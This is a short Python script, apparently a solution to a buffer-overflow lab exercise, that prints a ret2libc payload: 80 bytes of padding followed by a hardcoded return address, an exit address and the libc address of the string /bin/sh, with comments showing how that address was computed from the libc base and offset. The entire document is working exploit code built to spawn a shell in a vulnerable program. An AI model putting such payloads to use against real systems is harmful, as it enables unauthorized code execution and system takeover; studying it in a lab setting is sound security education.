
import struct

padding = "A" * 80
eip = struct.pack("I", 0xb7ecffb0)
extra = struct.pack("I",0xb7ec60c0)   # exit address it can be any arbitrary value
binsh = struct.pack("I",0xb7fb63bf)
# address of /bin/sh(/bin/sh is found at an offset of 11f3bf in /lib/libc-2.11.2.so and libc is loaded at 0xb7e97000)
# so actual address of /bin/sh will be 0xb7e97000 + 11f3bf = 0xb7fb63bf

print padding + eip+extra+binsh
